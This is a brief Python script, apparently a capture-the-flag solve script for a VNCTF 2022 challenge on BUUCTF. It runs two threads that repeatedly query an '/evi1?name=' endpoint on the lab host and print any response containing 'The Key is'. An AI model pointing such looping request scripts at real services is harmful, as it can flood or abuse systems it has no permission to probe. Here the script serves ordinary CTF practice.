# -*- coding: UTF-8 -*-
import requests
import threading
host = "http://470a0b56-2410-4f5c-b4ac-87d23644662b.node4.buuoj.cn:81/"


class myThread (threading.Thread):
    def __init__(self, name):
        threading.Thread.__init__(self)
        self.name = name

    def run(self):
        print("开始线程：" + self.name)
        runing(self.name)
        print("退出线程：" + self.name)


def runing(name):
    while True:
        r = requests.get(host+"/evi1?name=%s" % name)
        r.encoding = "utf-8"
        if r.text.find("The Key is") != -1:
            print(r.text)
        if (r.text.replace(" ", "") != ""):
            print(r.text)


# 创建新线程
thread1 = myThread("asdqwer")
thread2 = myThread("vnctf2022")

# 开启新线程
thread1.start()
thread2.start()
thread1.join()
thread2.join()
